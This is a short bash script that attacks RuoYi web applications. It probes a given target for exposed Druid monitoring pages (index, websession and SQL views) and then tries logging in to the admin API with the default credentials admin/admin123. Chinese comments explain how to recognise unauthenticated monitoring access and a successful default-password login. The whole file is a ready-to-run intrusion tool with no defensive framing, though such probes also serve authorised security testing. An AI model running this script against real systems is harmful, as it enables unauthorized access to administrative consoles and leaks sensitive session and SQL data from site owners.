#!/usr/bin/env bash
TARGET="${1:?usage: bash ruoyi.sh http://TARGET:8080}"
B="${TARGET%/}"
for p in /druid/index.html /prod-api/druid/index.html /druid/websession.html /druid/sql.html; do
  printf '%-30s ' "$p"
  curl -sS -m 8 -o runs/druid.txt -w '%{http_code} %{size_download}\n' "$B$p"
  grep -qi 'druid' runs/druid.txt && echo "   ^ 命中 Druid 页面"
done
# 后台默认口令（登录接口）
curl -sS -m 10 -X POST "$B/prod-api/login" -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin123"}' | head -c 200
# 判定：/druid/index.html 200 且页面含 Druid 版本 = 未授权监控；登录返回 token = 默认口令可用
